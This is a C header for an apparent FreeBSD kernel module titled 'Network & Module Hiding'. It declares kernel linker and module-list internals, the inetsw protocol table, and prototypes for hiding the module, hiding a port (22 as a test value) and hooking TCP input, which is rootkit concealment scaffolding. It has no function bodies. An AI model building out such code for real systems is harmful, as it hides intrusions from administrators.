/*
 * =================================================================================
 *
 *       Filename:  control_module.h
 *
 *    Description:  Network & Module Hiding
 *
 *        Version:  1.0
 *        Created:  2012-05-30 01:13:16
 *       Revision:  none
 *       Compiler:  clang
 *
 *         Author:  Steffen L. Norgren (http://nein.ca), ironix@nein.ca
 *        Company:  Esurient Systems Inc.
 *
 * =================================================================================
 */
#ifndef control_module_H
#define control_module_H

#include <sys/types.h>
#include <sys/param.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>

#include <sys/conf.h>
#include <sys/dirent.h>
#include <sys/ioccom.h>
#include <sys/libkern.h>
#include <sys/linker.h>
#include <sys/lock.h>
#include <sys/malloc.h>
#include <sys/mbuf.h>
#include <sys/mutex.h>
#include <sys/proc.h>
#include <sys/protosw.h>
#include <sys/sx.h>
#include <sys/syscall.h>
#include <sys/sysproto.h>
#include <sys/systm.h>
#include <sys/uio.h>

#include <netinet/in.h>
#include <netinet/in_pcb.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/ip_var.h>
#include <netinet/tcp.h>
#include <netinet/tcp_var.h>

#define TRUE        1
#define FALSE       0

#define MODULE_NAME "control_module"
#define MODULE_FILE "control_module.ko"
#define MODULE_HIDE FALSE

#define HIDE_PORT_TEST 22

/*
 * List of variables that need to be referenced in order to hide this module. 
 * These are not defined within any header files.
 */
extern linker_file_list_t linker_files;
extern struct sx kld_sx;
extern int next_file_id;
extern int nextid;

/* Accesss to the inetsw Switch table */
extern struct protosw inetsw[];

typedef TAILQ_HEAD(, module) modulelist_t;
extern modulelist_t modules;

struct module {
    TAILQ_ENTRY(module) link;       /* chain together all modules */
    TAILQ_ENTRY(module) flink;      /* all modules in a file */
    struct linker_file  *file;      /* file which contains this module */
    int                 refs;       /* reference count */
    int                 id;         /* unique id number */
    char                *name;      /* module name */
    modeventhand_t      handler;    /* event handler */
    void                *arg;       /* argument for handler */
    modspecific_t       data;       /* module specific data */
};

static int module_events(struct module *, int, void *);

static void hide_module(void);
static void hide_port(int);
static void tcp_input_hook(struct mbuf *, int);

#endif
